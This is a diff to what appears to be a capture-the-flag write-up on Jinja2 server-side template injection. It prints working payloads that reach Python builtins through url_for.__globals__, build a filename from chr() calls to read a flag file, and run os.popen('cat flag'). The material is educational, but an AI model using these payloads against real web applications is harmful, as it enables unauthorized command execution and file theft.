@@ -100,7 +100,7 @@
 {{ url_for.__globals__.__builtins__.open(url_for.__globals__.__builtins__.chr(102) + url_for.__globals__.__builtins__.chr(108) + url_for.__globals__.__builtins__.chr(97) + url_for.__globals__.__builtins__.chr(103)).read()}}
 ```
 #### Breaking down the payload
-1. To get the chr() function, we do the same thing as before, but access the [`__builtins__` module](https://docs.python.org/3/library/builtins.html), which has many useful functions, like `open()` and `chr()`
+1. To get the chr() function, we do the same thing as before, but access the [`__builtins__` module](https://docs.python.org/3/library/builtins.html), which has many useful functions, like `open()`,  `chr()`, and the other functions typically accessible in python
 	1. To get a character based on any ordinal value, we can write `url_for.__globals__.__builtins__.chr(NUM)`
 2. Thus, to get the whole `flag` string, we just append all of those together
 3. Then, we use `url_for.__globals__.os.open()` and pass in the flag string to read the flag file
@@ -155,5 +155,6 @@
 * Luckily, we can use the same payload we've been using for a while without any numbers
 
 ```python3
-url_for.__globals__.os.popen('cat flag').read()
+{{ url_for.__globals__.os.popen('cat flag').read() }}
 ```
+
